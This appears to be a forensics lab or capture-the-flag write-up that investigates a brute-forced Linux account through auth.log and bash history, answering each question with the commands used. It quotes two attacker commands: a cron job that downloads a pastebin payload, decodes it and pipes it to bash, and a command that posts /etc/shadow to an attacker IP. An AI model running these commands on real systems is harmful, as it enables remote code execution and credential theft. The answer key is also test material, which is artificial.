Scenario:

The IT Manager of Techniqua-Solutions Corp. is responsible for managing the company’s infrastructure. As part of his daily work, he frequently accesses company servers and workstations. One morning, the IT Manager discovered that several critical company files were missing, while others had been modified or replaced with unfamiliar ones. Concerned about a potential breach, he reported the issue to the security team.
As an incident response analyst, your task is to investigate the case. You have been provided with a forensic image of the IT Manager’s machine.

Artifacts:

        - bashrc
        - .profile
        - .bash_history
        - auth.log

Preparations:

        - Found all users **cat /etc/passwd | grep -i /bin/bash**
<img width="1920" height="1080" alt="2" src="https://github.com/user-attachments/assets/7d66695d-f4e6-4b20-8e71-3e2152e73ec6" />


Q) What method did the attacker use to gain access to the system?

**cat auth.log | grep -i failed | less**

<img width="1920" height="1080" alt="1" src="https://github.com/user-attachments/assets/88cbec5c-ac3a-4ea8-abfa-d3371bab1155" />


**Answer: Brute Force**

Q) At what time did the attacker successfully log in for the first time?

**cat auth.log | grep -i accepted | grep -i administrator**

<img width="1920" height="1080" alt="3" src="https://github.com/user-attachments/assets/b8a4de00-2286-4e05-89a1-3e47daf2b296" />


**Answer: 2025-02-10 19:39:03**

Q) Which user account was compromised by the attacker?

<img width="1920" height="1080" alt="3" src="https://github.com/user-attachments/assets/11852d7b-2e7e-4300-a5df-23f67d36a3ca" />


**Answer: administrator**

Q) What command was executed by the attacker to check user privileges?

<img width="1920" height="1080" alt="4" src="https://github.com/user-attachments/assets/a49a4dd2-0528-4bae-963a-702ee1535237" />


**Answer: groups administrator**

Q) What was the first tool the attacker downloaded to extract stored credentials from the system?

<img width="1920" height="1080" alt="5" src="https://github.com/user-attachments/assets/020475bf-2860-4797-a1d3-6f23229603bd" />


**Answer: LaZagne**

Q) The attacker located sensitive files on the compromised system and transferred them to a remote machine. Which command-line tool was used for this exfiltration?

<img width="1920" height="1080" alt="6" src="https://github.com/user-attachments/assets/7ddd76b9-0e95-4efa-b385-8e0634dfdd3d" />


**Answer: scp**

Q) What IP did the attacker exfiltrate the files to?

<img width="1920" height="1080" alt="6" src="https://github.com/user-attachments/assets/c20d95db-7eed-4b1d-99d9-71f3120dc925" />


**Answer: 192.168.161.198**

Q) The attacker continued their exploitation and executed a malicious script on the victim machine. What is the name of the script?

<img width="1920" height="1080" alt="7" src="https://github.com/user-attachments/assets/8b125a67-3bff-414f-a911-64c618006550" />


**Answer: sys_monitor.sh**

Q) What is the SHA1 hash of the malware?

<img width="1920" height="1080" alt="8" src="https://github.com/user-attachments/assets/5990b9ef-3e65-49a7-9fc2-c21c5078f964" />


**Answer: 3ae5dea716a4f7bfb18046bfba0553ea01021c75**

Q) The malware installed a component that pretends to be part of system network management but is actually running with root privileges. What is the name of the component?
 
Verify the /etc/systemd/system directory for persistent services.

<img width="1920" height="1080" alt="9" src="https://github.com/user-attachments/assets/e6354c92-d1b2-4bf8-ae40-47329a1db859" />


**Answer: systemd-networkm.service**

Q) The attacker modified several startup configuration files, each spawning a network listener on a different port at login. What is the name of the file that starts the listener on the lowest port number?

**cat root/.bashrc**

<img width="1920" height="1080" alt="10" src="https://github.com/user-attachments/assets/46915c69-f6c9-403d-9399-c390aff4d559" />


**Answer: .bashrc**

Q) What is the username and hostname associated with the attacker?

**cat home/administrator/bash_history**

<img width="1920" height="1080" alt="11" src="https://github.com/user-attachments/assets/36dcacf7-9c80-4fe8-946c-0e4b9e44d72e" />


**Answer: kali@kali**

Q) The attacker created a user for persistence, what is the name of the created user?

**cat auth.log | grep -i add**

<img width="1920" height="1080" alt="12" src="https://github.com/user-attachments/assets/17c7a222-15cb-4a42-b300-8c9487dcf62e" />


**Answer: Regev**

Q) At what exact timestamp was the new user created on the system?

**cat auth.log | grep -i add**

<img width="1920" height="1080" alt="13" src="https://github.com/user-attachments/assets/f2d0c973-7cf7-4f74-a069-a195e34634f8" />


**Answer: 2025-02-10 20:11:21**

Q) The malware set up an automated process to fetch and execute a remote payload from a legitimate web service. What is the full command responsible for retrieving this payload?

<img width="1920" height="1080" alt="14" src="https://github.com/user-attachments/assets/ef93adfd-dcf9-4299-9605-c448dadfad5a" />


**cat /etc/cron.d/syscheck**

<img width="1920" height="1080" alt="15" src="https://github.com/user-attachments/assets/50e3a6a1-bbb5-4e99-9a2f-aba7b4d6fa14" />


**Answer: command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash**

Q) The payload was used to extract more sensitive files. What was the command ran to extract the more sensitive file?

<img width="1920" height="1080" alt="16" src="https://github.com/user-attachments/assets/377712de-dd41-492f-891e-6b0d3ee85c24" />

<img width="1920" height="1080" alt="17" src="https://github.com/user-attachments/assets/c7035a14-eb2a-4b52-a60a-fee3d8d63461" />


**Answer: base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php**
